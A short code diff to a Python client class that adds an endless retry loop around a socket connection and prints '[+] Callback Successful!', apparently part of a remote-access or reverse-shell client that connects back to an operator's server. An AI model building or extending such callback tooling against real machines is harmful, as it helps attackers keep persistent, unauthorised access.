@@ -1,3 +1,4 @@
+from time import sleep
 import socket
 import zipfile
 import os
@@ -16,8 +17,15 @@ class ClientConnection:
      def CreateConnection(self, server_ip, server_port):
         self.server_ip = server_ip
         self.server_port = server_port
-        self.socket.connect((server_ip, server_port))
-         
+        while True:
+        	try :
+        		self.socket.connect((server_ip, server_port))
+        		break;
+        	except :
+        		print("[-] Retrying ")
+        		sleep(2)
+        print("[+] Callback Successful!")
+      
      def send_data(self, data):
         self.bytedata = self.encryptDecrypt(data,encode=True)
       #   self.bytedata = self.encryptDecrypt(data).encode('utf-8')
